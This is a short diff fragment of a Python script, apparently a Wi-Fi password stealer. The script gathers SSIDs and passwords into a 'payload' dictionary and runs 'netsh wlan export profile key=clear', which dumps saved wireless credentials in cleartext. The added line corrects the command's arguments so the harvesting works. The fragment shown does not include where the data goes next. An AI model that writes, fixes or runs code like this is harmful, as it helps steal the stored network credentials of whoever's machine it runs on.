@@ -7,6 +7,7 @@ wifi_files = []
 payload = {'SSID': [], 'Password': []}
 
 command = subprocess.run(['netsh', 'wlan', 'export profile', 'key=clear'], capture_output=True).stdout.decode()
+command = subprocess.run(['netsh', 'wlan', 'export', 'profile', 'key=clear'], capture_output=True).stdout.decode()
 
 path = os.getcwd()
 
